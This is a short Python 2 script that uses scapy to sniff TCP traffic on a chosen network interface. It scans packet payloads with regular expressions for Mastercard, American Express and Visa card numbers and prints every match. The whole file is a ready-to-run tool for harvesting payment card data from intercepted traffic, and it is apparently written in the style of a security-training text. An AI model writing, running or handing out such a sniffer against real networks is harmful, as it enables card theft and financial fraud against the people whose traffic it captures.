import re
import optparse
from scapy.all import *

def findCreditCard(pkt):
    raw = pkt.sprintf('%Raw.load%')
    masterRE = re.findall('5[1-5][0-9]{13}', raw)
    americaRE = re.findall('3[47][0-9]{13}', raw)
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)
    if masterRE:
        print '[+] Found Mastercard card: ' + masterRE[0]
    if americaRE:
        print '[+] Found American Express card: ' + americaRE[0]
    if visaRE:
        print '[+] Found Visa card: ' + visaRE[0]

def main():
    parser = optparse.OptionParser('usage%prog -i <interface>')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.usage
        exit(0)
    else: 
        conf.iface = options.interface
    try:
        print '[*] Starting credit card sniffer.'
        sniff(filter='tcp', prn=findCreditCard, store=0)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()